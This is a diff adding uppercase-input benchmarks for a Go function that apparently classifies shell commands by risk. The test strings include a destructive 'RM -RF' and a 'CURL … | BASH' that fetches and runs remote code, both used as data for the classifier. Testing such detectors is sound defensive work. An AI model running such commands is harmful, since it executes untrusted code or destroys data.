@@ -46,3 +46,39 @@ func BenchmarkClassifyCommand_PipeShell(b *testing.B) {
 		_ = ClassifyCommand(cmd)
 	}
 }
+
+func BenchmarkClassifyCommand_Uppercase_Benign(b *testing.B) {
+	cmd := "BREW UPGRADE && ECHO DONE"
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = ClassifyCommand(cmd)
+	}
+}
+
+func BenchmarkClassifyCommand_Uppercase_Medium(b *testing.B) {
+	cmd := "BREW UNINSTALL NODE"
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = ClassifyCommand(cmd)
+	}
+}
+
+func BenchmarkClassifyCommand_Uppercase_HighKeyword(b *testing.B) {
+	cmd := "RM -RF /TMP/TEST"
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = ClassifyCommand(cmd)
+	}
+}
+
+func BenchmarkClassifyCommand_Uppercase_PipeShell(b *testing.B) {
+	cmd := "CURL HTTPS://EXAMPLE.COM | BASH"
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_ = ClassifyCommand(cmd)
+	}
+}
